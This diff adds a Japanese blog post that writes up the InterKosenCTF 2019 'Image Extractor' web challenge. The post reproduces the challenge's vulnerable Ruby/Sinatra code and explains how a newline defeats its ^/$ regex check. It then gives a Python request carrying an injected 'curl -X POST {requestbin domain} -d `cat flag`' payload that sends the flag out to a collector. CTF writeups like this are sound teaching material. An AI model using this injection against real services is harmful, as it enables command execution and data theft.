@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8"/>
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
+	<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+	<meta name="Keywords"  content="iOS,safari,iphone,ipad" />
+	<title>クロワッサンはやっぱり黒くない</title>
+	<link href="https://fonts.googleapis.com/earlyaccess/roundedmplus1c.css" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" />
+	<link rel="stylesheet" href="/croissant/css/style.css"/>
+</head>
+<body>
+	<header>
+		<img src="http://wassan128.github.io/img/icon.png"/>
+		<h1><a href="/croissant/">クロワッサンはやっぱり黒くない</a></h1>
+		<h3>とある社会人の備忘録 - 2nd season</h3>
+	</header>
+	<main>
+
+<article><h1>InterKosenCTF - Image Extractor writeupの話</h1>
+
+<p>2019年8月11日〜2019年8月12日にかけて36時間行われたInterKosenCTFにチームEAnbaiのメンバーとして参加し、チームとしては23位で終了した。個人的にはWeb問に取り組んだが、そのうち「Image Extractor」のwriteupを書き残す。</p>
+
+<h2>TL;DR</h2>
+<pre style="color:#e7e9db;background-color:#2f1e2e">/image.png<span style="color:#f99b15">\n</span>curl -X POST <span style="color:#5bc4bf">{</span>requestbin domain<span style="color:#5bc4bf">}</span> -d <span style="color:#48b685">`</span>cat flag<span style="color:#48b685">`</span>; #
+</pre>
+<h2>Image Extractor</h2>
+
+<blockquote>
+<p>My hated friend releases a service which extracts images from a document. I want to break it to read /flag.</p>
+</blockquote>
+
+<p><code>.docx</code> ファイルをアップロードするとその中に含まれている画像ファイルをリストしたり、個別にダウンロードできる機能を持ったWebアプリケーションである。</p>
+
+<p>Ruby(sinatra)構成となっており、コードは以下</p>
+<pre style="color:#e7e9db;background-color:#2f1e2e">require <span style="color:#48b685">&#39;sinatra&#39;</span>
+require <span style="color:#48b685">&#39;securerandom&#39;</span>
+require <span style="color:#48b685">&#39;fileutils&#39;</span>
+
+set <span style="color:#48b685">:environment</span>, <span style="color:#48b685">:production</span>
+
+before <span style="color:#815ba4">do</span>
+  <span style="color:#815ba4">if</span> <span style="color:#ef6155">Dir</span><span style="color:#5bc4bf">.</span>exists?(<span style="color:#48b685">&#34;</span><span style="color:#48b685">workdir</span><span style="color:#48b685">&#34;</span>)
+    du <span style="color:#5bc4bf">=</span> <span style="color:#48b685">`</span><span style="color:#48b685">du -s workdir</span><span style="color:#48b685">`</span><span style="color:#5bc4bf">.</span>split<span style="color:#5bc4bf">[</span><span style="color:#f99b15">0</span><span style="color:#5bc4bf"></span><span style="color:#5bc4bf">]</span><span style="color:#5bc4bf">.</span>to_i
+    <span style="color:#815ba4">if</span> du <span style="color:#5bc4bf">*</span> <span style="color:#f99b15">512</span> <span style="color:#5bc4bf"></span><span style="color:#5bc4bf">&gt;</span><span style="color:#5bc4bf">=</span> <span style="color:#f99b15">1024</span> <span style="color:#5bc4bf"></span><span style="color:#5bc4bf">*</span> <span style="color:#f99b15">1024</span> <span style="color:#5bc4bf"></span><span style="color:#5bc4bf">*</span> <span style="color:#f99b15">10</span>
+      <span style="color:#5bc4bf"></span><span style="color:#ef6155">FileUtils</span><span style="color:#5bc4bf">.</span>rm_rf(<span style="color:#48b685">&#34;</span><span style="color:#48b685">workdir</span><span style="color:#48b685">&#34;</span>)
+      <span style="color:#ef6155">Dir</span><span style="color:#5bc4bf">.</span>mkdir(<span style="color:#48b685">&#34;</span><span style="color:#48b685">workdir</span><span style="color:#48b685">&#34;</span>)
+    <span style="color:#815ba4">end</span>
+  <span style="color:#815ba4">else</span>
+    <span style="color:#ef6155">Dir</span><span style="color:#5bc4bf">.</span>mkdir(<span style="color:#48b685">&#34;</span><span style="color:#48b685">workdir</span><span style="color:#48b685">&#34;</span>)
+  <span style="color:#815ba4">end</span>
+<span style="color:#815ba4">end</span>
+
+get <span style="color:#48b685">&#39;/&#39;</span> <span style="color:#815ba4">do</span>
+  erb <span style="color:#48b685">:index</span>
+<span style="color:#815ba4">end</span>
+
+get <span style="color:#48b685">&#39;/upload&#39;</span> <span style="color:#815ba4">do</span>
+  erb <span style="color:#48b685">:index</span>
+<span style="color:#815ba4">end</span>
+
+post <span style="color:#48b685">&#39;/upload&#39;</span> <span style="color:#815ba4">do</span>
+  <span style="color:#815ba4">if</span> params<span style="color:#5bc4bf">[</span><span style="color:#48b685">:file</span><span style="color:#5bc4bf">]</span>
+    <span style="color:#815ba4">begin</span>
+      name <span style="color:#5bc4bf">=</span> <span style="color:#ef6155">SecureRandom</span><span style="color:#5bc4bf">.</span>hex(<span style="color:#f99b15">16</span><span style="color:#5bc4bf"></span>)
+      filename <span style="color:#5bc4bf">=</span> <span style="color:#ef6155">File</span><span style="color:#5bc4bf">.</span>join(<span style="color:#48b685">&#34;</span><span style="color:#48b685">workdir</span><span style="color:#48b685">&#34;</span> , name <span style="color:#5bc4bf">+</span> <span style="color:#48b685">&#34;</span><span style="color:#48b685">.zip</span><span style="color:#48b685">&#34;</span>)
+      <span style="color:#ef6155">FileUtils</span><span style="color:#5bc4bf">.</span>copy(params<span style="color:#5bc4bf">[</span><span style="color:#48b685">:file</span><span style="color:#5bc4bf">]</span><span style="color:#5bc4bf">[</span><span style="color:#48b685">:tempfile</span><span style="color:#5bc4bf">]</span><span style="color:#5bc4bf">.</span>to_path, filename)
+      files <span style="color:#5bc4bf">=</span> <span style="color:#48b685">`</span><span style="color:#48b685">zipinfo -1 </span><span style="color:#f99b15">#{</span>filename<span style="color:#f99b15">}</span><span style="color:#48b685">`</span>
+      <span style="color:#815ba4">raise</span> <span style="color:#48b685">&#34;</span><span style="color:#48b685">ERROR</span><span style="color:#48b685">&#34;</span> <span style="color:#815ba4">if</span> files<span style="color:#5bc4bf">.</span>lines<span style="color:#5bc4bf">.</span>grep(<span style="color:#48b685">/</span><span style="color:#48b685">^word</span><span style="color:#48b685">\/</span><span style="color:#48b685">media</span><span style="color:#48b685">\/</span><span style="color:#48b685">/</span>)<span style="color:#5bc4bf">.</span>empty?
+      redirect to(<span style="color:#48b685">&#39;/images/&#39;</span> <span style="color:#5bc4bf">+</span> name)
+    <span style="color:#815ba4">rescue</span>
+      <span style="color:#ef6155">File</span><span style="color:#5bc4bf">.</span>delete(filename)
+      @err <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#34;</span><span style="color:#48b685">FAILED to upload a file</span><span style="color:#48b685">&#34;</span>
+      erb <span style="color:#48b685">:index</span>
+    <span style="color:#815ba4">end</span>
+  <span style="color:#815ba4">else</span>
+    @err <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;FAILED to upload a file&#39;</span>
+    erb <span style="color:#48b685">:index</span>
+  <span style="color:#815ba4">end</span>
+<span style="color:#815ba4">end</span>
+
+get <span style="color:#48b685">&#39;/images/:name&#39;</span> <span style="color:#815ba4">do</span> <span style="color:#5bc4bf">|</span>name<span style="color:#5bc4bf">|</span>
+  zipfile <span style="color:#5bc4bf">=</span> <span style="color:#ef6155">File</span><span style="color:#5bc4bf">.</span>join(<span style="color:#48b685">&#34;</span><span style="color:#48b685">workdir</span><span style="color:#48b685">&#34;</span>, name <span style="color:#5bc4bf">+</span> <span style="color:#48b685">&#34;</span><span style="color:#48b685">.zip</span><span style="color:#48b685">&#34;</span>)
+  <span style="color:#815ba4">if</span> name <span style="color:#5bc4bf">!~</span> <span style="color:#48b685">/</span><span style="color:#48b685">^[a-f0-9]{32}$</span><span style="color:#48b685">/</span> <span style="color:#5bc4bf">||</span> <span style="color:#5bc4bf">!</span><span style="color:#ef6155">File</span><span style="color:#5bc4bf">.</span>exists?(zipfile)
+    @err <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#34;</span><span style="color:#48b685">Not Found</span><span style="color:#48b685">&#34;</span>
+    erb <span style="color:#48b685">:index</span>
+  <span style="color:#815ba4">else</span>
+    @name <span style="color:#5bc4bf">=</span> name
+    @images <span style="color:#5bc4bf">=</span> <span style="color:#48b685">`</span><span style="color:#48b685">zipinfo -1 </span><span style="color:#f99b15">#{</span>zipfile<span style="color:#f99b15">}</span><span style="color:#48b685">`</span><span style="color:#5bc4bf">.</span>lines<span style="color:#5bc4bf">.</span>grep(<span style="color:#48b685">/</span><span style="color:#48b685">^word</span><span style="color:#48b685">\/</span><span style="color:#48b685">media</span><span style="color:#48b685">\/</span><span style="color:#48b685">[A-Za-z0-9_]+</span><span style="color:#48b685">\</span><span style="color:#48b685">.[A-Za-z0-9_]+</span><span style="color:#48b685">/</span>)<span style="color:#5bc4bf">.</span>map <span style="color:#815ba4">do</span> <span style="color:#5bc4bf">|</span>path<span style="color:#5bc4bf">|</span>
+      path<span style="color:#5bc4bf">.</span>delete_prefix(<span style="color:#48b685">&#34;</span><span style="color:#48b685">word/media/</span><span style="color:#48b685">&#34;</span>)
+    <span style="color:#815ba4">end</span>
+    erb <span style="color:#48b685">:images</span>
+  <span style="color:#815ba4">end</span>
+<span style="color:#815ba4">end</span>
+
+get <span style="color:#48b685">&#39;/image/:name/:image&#39;</span> <span style="color:#815ba4">do</span>
+  puts
+  puts params<span style="color:#5bc4bf">[</span><span style="color:#48b685">:image</span><span style="color:#5bc4bf">]</span>
+  puts
+  <span style="color:#815ba4">if</span> params<span style="color:#5bc4bf">[</span><span style="color:#48b685">:name</span><span style="color:#5bc4bf">]</span> <span style="color:#5bc4bf">!~</span> <span style="color:#48b685">/</span><span style="color:#48b685">^[a-f0-9]{32}$</span><span style="color:#48b685">/</span> <span style="color:#5bc4bf">||</span> params<span style="color:#5bc4bf">[</span><span style="color:#48b685">:image</span><span style="color:#5bc4bf">]</span> <span style="color:#5bc4bf">!~</span> <span style="color:#48b685">/</span><span style="color:#48b685">^[A-Za-z0-9_]+</span><span style="color:#48b685">\</span><span style="color:#48b685">.[A-Za-z0-9_]+$</span><span style="color:#48b685">/</span>
+    @err <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#34;</span><span style="color:#48b685">Not Found</span><span style="color:#48b685">&#34;</span>
+    erb <span style="color:#48b685">:index</span>
+  <span style="color:#815ba4">else</span>
+    zipfile <span style="color:#5bc4bf">=</span> <span style="color:#ef6155">File</span><span style="color:#5bc4bf">.</span>join(<span style="color:#48b685">&#34;</span><span style="color:#48b685">workdir</span><span style="color:#48b685">&#34;</span>, params<span style="color:#5bc4bf">[</span><span style="color:#48b685">:name</span><span style="color:#5bc4bf">]</span> <span style="color:#5bc4bf">+</span> <span style="color:#48b685">&#34;</span><span style="color:#48b685">.zip</span><span style="color:#48b685">&#34;</span>)
+    filedir <span style="color:#5bc4bf">=</span> <span style="color:#ef6155">File</span><span style="color:#5bc4bf">.</span>join(<span style="color:#48b685">&#34;</span><span style="color:#48b685">workdir</span><span style="color:#48b685">&#34;</span>, <span style="color:#ef6155">SecureRandom</span><span style="color:#5bc4bf">.</span>hex(<span style="color:#f99b15">16</span><span style="color:#5bc4bf"></span>))
+    file <span style="color:#5bc4bf">=</span> <span style="color:#ef6155">File</span><span style="color:#5bc4bf">.</span>join(filedir, params<span style="color:#5bc4bf">[</span><span style="color:#48b685">:image</span><span style="color:#5bc4bf">]</span>)
+    system(<span style="color:#48b685">&#34;</span><span style="color:#48b685">unzip -j </span><span style="color:#f99b15">#{</span>zipfile<span style="color:#f99b15">}</span><span style="color:#48b685"> word/media/</span><span style="color:#f99b15">#{</span>params<span style="color:#5bc4bf">[</span><span style="color:#48b685">:image</span><span style="color:#5bc4bf">]</span><span style="color:#f99b15">}</span><span style="color:#48b685"> -d </span><span style="color:#f99b15">#{</span>filedir<span style="color:#f99b15">}</span><span style="color:#48b685">&#34;</span>)
+    <span style="color:#815ba4">if</span> <span style="color:#ef6155">File</span><span style="color:#5bc4bf">.</span>exists?(file)
+      send_file(file)
+    <span style="color:#815ba4">else</span>
+      @err <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#34;</span><span style="color:#48b685">Not Found</span><span style="color:#48b685">&#34;</span>
+      erb <span style="color:#48b685">:index</span>
+    <span style="color:#815ba4">end</span>
+  <span style="color:#815ba4">end</span>
+<span style="color:#815ba4">end</span>
+</pre>
+<p><code>system</code> 関数内での変数展開が行われていることなどから、Command injectionを使うことが予想されるが、各エンドポイントにパスとして渡されるファイル名などのパラメータは正規表現によりそのパターンに一致しない場合 <code>Not Found</code> エラーを返すなどの処理が施されている。このため、</p>
+
+<p><code>http://web.kosenctf.com:12000/image/xxxxxxxxxxxxxxxx/image.png;ls</code></p>
+
+<p>のようなパターンは弾かれてしまう。</p>
+
+<p>しかし、この問題の正規表現をよく見ると先頭/末尾を表す文字に <code>^</code>, <code>$</code> が使われている。<a href="https://blog.tokumaru.org/2014/03/z.html" rel="nofollow">徳丸先生もおっしゃられている</a>ように、Rubyにおいては <code>/^$/</code> は行の先頭/末尾を示すパターンであり、複数行の場合はこの限りでない。つまり、</p>
+
+<p><code>http://web.kosenctf.com:12000/image/xxxxxxxxxxxxxxxx/image.png\n;ls</code></p>
+
+<p>とした場合、上記の正規表現チェックを回避できる。
+これを <code>/image/:name/:image</code> エンドポイント内の <code>system</code> 関数内で用い、flagを外へ持ち出すコードが以下である。</p>
+<pre style="color:#e7e9db;background-color:#2f1e2e"><span style="color:#5bc4bf">import</span> <span style="color:#fec418">requests</span>
+
+requests<span style="color:#5bc4bf">.</span>get(<span style="color:#48b685"></span><span style="color:#48b685">&#34;</span><span style="color:#48b685">http://web.kosenctf.com:12000/image/xxxxxxxxxxxxxxxx/image.png</span><span style="color:#f99b15">\n</span><span style="color:#48b685">curl -X POST {requestbin domain} -d `cat flag`; #</span><span style="color:#48b685">&#34;</span>)<span style="color:#ef6155">`</span><span style="color:#48b685"></span><span style="color:#48b685">&#34;</span><span style="color:#48b685">)</span><span style="color:#ef6155">
+</span></pre>
+<p>ファイル名のあとに改行を挿入し、 <code>curl</code> コマンドで <code>cat flag</code> の結果を <code>-d</code> パラメータでくっつけて<a href="https://requestbin.com" rel="nofollow">requestbin</a>に立てたサーバへとPOSTしている。これで実際に <code>system</code> 関数で実行されるコマンドは以下のようになるはずだ。</p>
+<pre style="color:#e7e9db;background-color:#2f1e2e">unzip -j ZIP_FILE word/media/image.png<span style="color:#f99b15">\n</span>curl -X POST <span style="color:#5bc4bf">{</span>requestbin domain<span style="color:#5bc4bf">}</span> -d <span style="color:#48b685">`</span>cat flag<span style="color:#48b685">`</span>; <span style="color:#776e71"># -d FILE_DIR</span>
+</pre>
+<p>requestbinの画面で以下のようにフラグが表示された。</p>
+
+<p><img src="flag.png" alt=""/></p>
+
+<h2>おわりに</h2>
+
+<p>フラグ読む感じsymbolic linkを使ってやる感じだったっぽい</p>
+<aside><p class='post-tags'><a href='/croissant/tags/ctf'>#ctf</a></p><p class='post-date'>投稿日: 2019/08/12</p>
+</aside></article>
+	</main>
+	<footer>
+		<p>&copy; 2018 wassan128 / MeltDowner</p>
+	</footer>
+</body>
+</html>
+
+
